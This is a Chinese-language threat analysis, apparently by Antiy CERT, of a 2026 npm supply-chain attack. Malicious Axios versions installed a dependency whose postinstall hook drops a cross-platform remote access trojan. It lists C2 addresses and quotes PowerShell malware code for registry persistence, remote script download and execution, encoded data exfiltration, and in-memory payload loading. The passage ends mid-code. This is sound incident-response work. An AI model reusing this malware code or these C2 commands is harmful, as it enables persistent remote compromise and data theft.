---
title: Axios遭遇“指令闪击”——npm仓库OrDer木马投毒事件分析
url: https://mp.weixin.qq.com/s/m3bWIoagNeuV9c_jI3Ez5A
source: Doonsec's feed
date: 2026-03-31
fetch_date: 2026-04-01T04:42:29.990715
---

# Axios遭遇“指令闪击”——npm仓库OrDer木马投毒事件分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XBFaicYdOHk98icdoUGD3hDpxpJmouV5DOuYGwGkwRlsgjeYbOJ7LGnHjOe3ibYqJgbxic7dq0ky3fhj5THmnKkA3ualDBEHYOxeSxMiaFZlEtvY/0?wx_fmt=jpeg)

# Axios遭遇“指令闪击”——npm仓库OrDer木马投毒事件分析

安天CERT
安天CERT

安天集团

![]()

在小说阅读器中沉浸阅读

点击上方"蓝字"

关注我们吧！

**01**

**概述**

2026年3月31日，知名JavaScript HTTP客户端库Axios在npm仓库遭遇供应链投毒攻击成为近期又一起重大开源软件供应链攻击事件，对AI软件生态构成重大关联威胁。[安天CERT](https://mp.weixin.qq.com/s?__biz=MjM5MTA3Nzk4MQ==&mid=2650208789&idx=2&sn=00b7643e03b81ed7c151388153fce778&scene=21#wechat_redirect)对其Powershell、Python和MacOS相关恶意代码样本载荷做了完整分析，并基于其解密密钥中的字符串“OrDer”，将本事件中文命名为**“指令闪击”**，[安天AVL SDK引擎](https://mp.weixin.qq.com/s?__biz=MjM5MTA3Nzk4MQ==&mid=2650211782&idx=1&sn=06dcc3c05ffce88f87cd134034aaf559&scene=21#wechat_redirect)、[智甲EDR](https://mp.weixin.qq.com/s?__biz=MjM5MTA3Nzk4MQ==&mid=2650205228&idx=3&sn=72473850250f89f2d1b2896b6e5fa702&scene=21#wechat_redirect)、在线分析能力等进行了快速应对升级，将以上工作情况与基于大模型的信息汇聚结合，我们发布本报告。

特别说明：我们将尚在开发中的新产品AVL Code投入了本次事件样本的自动化分析工作，输出长图，作为本报告的附件一。我们将在4月1日的在哈工大举行的“冰城虾友会”技术沙龙，对AVL Code等四款新品开启线上预约。直播信息明日公众号公布。

**Axios**是一个基于Promise的JavaScript HTTP客户端库，可用于浏览器和Node.js环境。它是一个“同构”（isomorphic）库，意味着同一套代码可以在浏览器和服务器端运行——在浏览器中使用XMLHttpRequest，在Node.js中使用原生http模块。Axios是npm上最受欢迎的JavaScript包之一，具有惊人的下载量和影响面：

|  |  |
| --- | --- |
| **指标** | **数据** |
| **周下载量** | 超过**8300万次** |
| **当日下载量** | **12,000,000 次**（截至到20:38 统计） |
| **历史峰值** | 部分统计显示曾超过**3亿次**周下载量 |
| **许可证** | MIT License（保留软件声明可无限分发使用） |
| **当前版本** | 1.14.0 |

攻击者通过窃取核心维护者npm账号，在短时间内发布了axios@1.14.1和axios@0.30.4两个恶意版本，通过植入恶意依赖plain-crypto-js@4.2.1，在用户安装时自动投递跨平台远程访问木马（RAT）。作为npm生态中周下载量超8000万的核心基础库，Axios此次被投毒影响范围极广，涉及全球数百万开发者及项目，大量基于JavaScript的Web应用、前端项目及后端服务均面临被入侵的风险，目前恶意版本已被npm官方紧急下架。

安天针对本事件进行了快速响应：进行了AVL SDK反病毒引擎规则库升级、智甲EDR主防规则库升级、计算机病毒分类百科全书在线分析功能改善，并拟在[百科全书](https://mp.weixin.qq.com/s?__biz=MjM5MTA3Nzk4MQ==&mid=2650201561&idx=1&sn=906106d8d6f4b68a5e381b538d4db91a&scene=21#wechat_redirect)推出新的知识频道——AI供应链安全分析。

近期AI生态相关软件供应链投毒频发，我们依托大模型梳理了相关主要事件、分析了关联风险，给出了防护建议。

**02**

**攻击事件详情**

## 2.1 **时间线**

**表****2****-****1****A****xios****npm供应链投毒事件时间线**

|  |  |
| --- | --- |
| **时间** | **事件** |
| 2026-03-30 05:57（UTC） | 攻击者注册nrwise账户，发布干净的诱饵包plain-crypto-js@4.2.0，建立正常发布历史 |
| 2026-03-30 23:59（UTC） | 攻击者发布含恶意postinstall钩子的plain-crypto-js@4.2.1 |
| 2026-03-31 00:21（UTC） | 攻击者发布axios@1.14.1（1.x主线版本） |
| 2026-03-31 01:00（UTC） | 攻击者发布axios@0.30.4（0.x旧分支版本） |
| 2026-03-31 03:15（UTC） | npm官方发现并下架两个恶意axios版本 |
| 2026-03-31 04:26（UTC） | npm官方发布安全占位包，阻断plain-crypto-js@4.2.1安装 |
| 2026-03-31 08:00-12:00 | OpenClaw用户因上游依赖污染被动接触恶意代码 |

## 2.2 **攻击手段**

攻击者首先窃取了Axios核心维护者jasonsaayman的npm账户权限，将注册邮箱修改为匿名ProtonMail地址（ifstap@proton.me），随后利用长期有效的npm访问令牌手动发布恶意版本，绕过了Axios官方的GitHub Actions + OIDC可信发布机制。恶意版本特征：无OIDC签名、无gitHead字段、无对应GitHub commit/tag，发布方式为手动npm CLI而非CI/CD自动化流程。攻击者在axios的package.json中悄悄添加了plain-crypto-js@^4.2.1，但Axios源码中从未import或require该包。当用户执行npm install axios@1.14.1时，npm自动解析依赖树并安装plain-crypto-js@4.2.1，随后触发postinstall钩子执行node setup.js，自动启动恶意程序。

## 2.3 **恶意代码功能**

plain-crypto-js@4.2.1中的setup.js是一个高度混淆的RAT投放器，支持macOS、Windows、Linux三平台。C2服务器地址：http://sfrclak.com:8000/6202033

**表****2****-****2****各平台攻击方式汇总**

|  |  |  |
| --- | --- | --- |
| **平台** | **攻击方式** | **文件路径** |
| macOS | 生成AppleScript临时文件，通过osascript静默执行；连接C2下载Mach-O RAT；赋权chmod 770后后台持久化运行 | /Library/Caches/com.apple.act.mond |
| Windows | 定位PowerShell路径，复制为wt.exe伪装Windows Terminal；写入VBScript隐藏窗口执行PowerShell脚本；下载RAT载荷后自删除 | C:\ProgramData\wt.exe（持久化）；%TEMP%\6202033.ps1（临时） |
| Linux | 直接通过curl下载Python RAT脚本，使用nohup后台持久化执行 | /tmp/ld.py |

自清除机制：执行完成后，恶意脚本删除setup.js自身、删除含postinstall钩子的package.json，将预置的干净存根package.md重命名为package.json，事后审计无法发现痕迹。

**03**

**技术分析**

## 3.1 **恶意包结构分析**

plain-crypto-js@4.2.1包结构关键特征：

lpackage.json中含postinstall钩子："postinstall": "node setup.js"

l包含预置的干净存根package.md（版本4.2.0内容，无postinstall）

lsetup.js采用双层混淆：字符串数组+自定义解码函数

lsetup.js关键字符串（解码后）：child\_process、os、fs、http://sfrclak.com:8000/

**表****3****-****1****样本标签**

|  |  |
| --- | --- |
| **恶意代码名称** | Trojan/JS.OrDeR[Downloader] |
| **MD5** | 7658962AE060A222C0058CD4E979BFA1 |
| **原始文件名** | setup.js |
| **文件大小** | 4.11 KB（4209字节） |
| **文件格式** | Script/Netscape.JS |
| **信息来源** | Virusview.net |
| **分析时间** | 2026-03-31 19:32:16 |

混淆的setup.js代码如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/XBFaicYdOHk8axXx67oHp0TKFF1ftkne4libT3Hwq2rEwMSicApoIaDkFZpp0G0VAX4ibfOF89w4J7Dial8bg8yvBfNLsZ923ILVqnBZDmKC2INM/640?wx_fmt=png&from=appmsg)

**图****3****-****1****混淆的setup****.js****代码**

解混淆后的setup.js代码如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/XBFaicYdOHkibrmyIMCdIUDIB1NibuBvkBSj6Ieicn2pCZALuJQstalLg8oibOpXQibFPKgyyjsLbF3uuGX23ea9ZgFW8JbcFM75LyicLqhFXDCqvM/640?wx_fmt=png&from=appmsg)

**图****3****-****2****解混淆后的代码**

ord = “OrDeR\_7077”定义了解密密钥，OrDeR 7077被转换为数字数组时，只有最后4位数字7077有效(字母转换为NaN，在JavaScript位运算中视为0)，实际有效密钥为[0,0,0,0,0,0,7,0,7,7]，我们按照提取特殊字符串作为恶意代码命名的原则，将相关恶意代码家族命名为OrDeR，并均划入特洛伊木马（Trojan）类别。解密后得到如下表所示明文内容：

**表****3****-****2****关键字符串解密结果**

|  |  |  |
| --- | --- | --- |
| **数组索引** | **解密后内容** | **功能描述** |
| stq[0] | "child process" | Node.js子进程模块 |
| stq[1] | "os" | 操作系统信息模块 |
| stq[2] | "fs" | 文件系统模块 |
| stq[3] | "http://45.142.212.18:8080/" | C2服务器地址 |
| stq[5] | "win32" | Windows平台标识 |
| stq[6] | "linux" | Linux平台标识 |
| stq[7] | Windows PowerShell下载脚本 | Windows端恶意脚本 |
| stq[9] | Linux bash下载脚本 | Linux端恶意脚本 |
| stq[13] | 当前脚本文件名 | 用于自我删除 |

## 3.2 **各平台Payload解码**

根据不同的操作系统发送不同的请求，如下表所示：

**表****3****-****3****各平台****P****ayload解码**

|  |  |  |
| --- | --- | --- |
| **平台** | **POST body** | **执行命令** |
| **macOS** | packages.npm.org/product0 | curl下载二进制至/Library/Caches/com.apple.act.mond，chmod 770，nohup后台执行 |
| **Windows** | packages.npm.org/product1 | curl下载.ps1脚本，powershell -w hidden -ep bypass执行 |
| **Linux** | packages.npm.org/product2 | curl下载Python脚本至/tmp/ld.py，nohup后台执行 |

### 3.2.1 **Powershell脚本分析**

该PowerShell样本是一个针对Windows环境的远程控制木马。其核心特征在于利用注册表Run键和隐藏的批处理文件实现开机隐蔽驻留，并通过伪造陈旧的IE 8浏览器流量与命令与控制（C2）服务器维持长连接信标。除了常规的系统指纹收集与高价值文件目录遍历外，该样本最具威胁的能力是支持“无文件”攻击。它能够接收远端下发的恶意脚本或二进制数据，利用注入技术直接在当前PowerShell进程的内存中加载并执行载荷。

#### 3.2.1.1 **样本标签**

**表****3****-****4****样本标签**

|  |  |
| --- | --- |
| **恶意代码名称** | Trojan/PowerShell.OrDeR[Backdoor] |
| **MD5** | 04E3073B3CD5C5BFCDE6F575ECF6E8C1 |
| **原始文件名** | 6202033 |
| **文件大小** | 10.78 KB（11042字节） |
| **文件格式** | Script/Microsoft.PowerShell |
| **信息来源** | Virusview.net |
| **分析时间** | 2026-03-31 19:46:50 |

#### 3.2.1.2 **持久化机制**

脚本在C:\ProgramData目录下创建了一个名为system.bat的隐藏批处理文件。它将这个批处理文件添加到了当前用户的启动注册表项中，并将其伪装成MicrosoftUpdate。

|  |
| --- |
| $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"  $regName = "MicrosoftUpdate" #   $batFile = Join-Path $env:PROGRAMDATA "system.bat"  $batCont = "start /min powershell -w h -c " + """" + "& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -UseBasicParsing -Uri '" + $url + "' -Method POST -Body 'packages.npm.org/product1').Content))) '" + $url + "'"""  Set-Content -Path $batFile -Value $batCont -Encoding ASCII  Set-ItemProperty -Path $batFile -Name Attributes -Value Hidden  Set-ItemProperty -Path $regKey -Name $regName -Value $batFile |

#### 3.2.1.3 **C****2****通信与数据外发**

伪造HTTP头部，并将外发数据进行了Base64编码以逃避明文检测。

|  |
| --- |
| function Get-Response {      $wc = New-Object System.Net.WebClient      $wc.Headers["User-Agent"] = "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)"      $wc.Headers["Content-Type"] = "application/x-www-form-urlencoded"      $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)      $base64Body = [Convert]::ToBase64String($bodyBytes)      $postBytes = [System.Text.Encoding]::UTF8.GetBytes($base64Body)      $responseBytes = $wc.UploadData($url, "POST", $postBytes)      return $responseBytes  } |

#### 3.2.1.4 **内存加载与P****E****注入**

接收远端下发的Base64编码的DLL和二进制数据，直接在PowerShell进程的内存中加载执行，不产生落地文件。

|  |
| --- |
| function Do-Action-Ijt {      [byte[]]$rotjni = [System.Convert]::FromBase64String($ijtdll)      [byte[]]$daolyap = [System.Convert]::FromBase64String($ijtbin)      $assem = [System.Refl...